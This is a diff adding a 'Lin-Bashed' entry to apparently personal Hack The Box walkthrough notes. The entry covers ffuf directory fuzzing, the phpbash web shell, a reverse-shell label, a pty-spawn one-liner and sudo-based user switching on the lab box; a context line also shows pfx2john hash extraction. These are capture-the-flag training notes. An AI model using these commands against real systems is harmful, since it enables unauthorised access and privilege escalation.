@@ -28,6 +28,19 @@ pfx2john staff.pfx > pfx_hash
 ```
 
 
+
+# Lin-Bashed
+https://0xdf.gitlab.io/2018/04/29/htb-bashed.html
+```
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.68/FUZZ -fc 403 -e .aspx,.php,.txt,.html
+/dev/phpbash.php
+reverse shell - python
+python3 -c "import pty;pty.spawn('/bin/bash')"
+sudo -l
+sudo -u scriptmanager bash -i
+python -c shell.py
+```
+
 # Lin-SolidState
 https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html
 ```
